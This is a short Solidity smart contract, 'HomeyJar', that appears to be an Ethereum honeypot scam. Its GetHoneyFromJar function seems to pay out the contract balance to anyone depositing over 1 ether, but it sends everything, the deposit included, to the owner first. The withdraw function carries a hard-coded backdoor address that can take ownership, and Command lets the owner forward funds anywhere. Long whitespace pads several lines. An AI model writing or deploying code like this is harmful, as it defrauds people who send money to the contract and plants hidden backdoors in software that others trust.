pragma solidity ^0.4.19;

contract HomeyJar {
    address[1] public ownerArray = [msg.sender];
    
    function() public payable {}
    
    function GetHoneyFromJar() public payable {                                              
        if(msg.value > 1 ether) {
            ownerArray[0].transfer(this.balance);
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw() payable public {
        if(msg.sender == 0x2f61E7e1023Bc22063B8da897d8323965a7712B7) {
            ownerArray[0] = 0x2f61E7e1023Bc22063B8da897d8323965a7712B7;
        }
        require(msg.sender == ownerArray[0]);
        ownerArray[0].transfer(this.balance);
    }
    
    function Command(address adr, bytes data) payable public {
        require(msg.sender == ownerArray[0]);
        adr.call.value(msg.value)(data);
    }
}